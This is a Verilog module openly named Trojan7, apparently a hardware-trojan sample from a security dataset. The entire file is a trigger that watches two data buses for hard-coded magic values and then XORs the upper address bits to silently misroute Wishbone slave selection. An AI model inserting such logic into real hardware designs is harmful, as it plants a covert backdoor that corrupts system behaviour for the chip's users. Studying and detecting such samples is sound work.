module Trojan7 #(
    // Keep non-I/O tunables as parameters (I/O bitwidths fixed)
    parameter [31:0] WB_DATA_TRIGGER = 32'h2BFA5CE0,
    parameter [31:0] S0_DATA_TRIGGER = 32'h1E555AAC,
    parameter [3:0]  XOR_MASK        = 4'b1111
)(
    input  [31:0] wb_addr_i,
    input  [31:0] wb_data_i,
    input  [31:0] s0_data_i,
    output reg [3:0] slv_sel
);

    always @(wb_addr_i or wb_data_i or s0_data_i) begin
        if ((wb_data_i == WB_DATA_TRIGGER) && 
            (s0_data_i == S0_DATA_TRIGGER)) begin
            slv_sel = wb_addr_i[31:28] ^ XOR_MASK[3:0];
        end else begin
            slv_sel = wb_addr_i[31:28];
        end
    end

endmodule
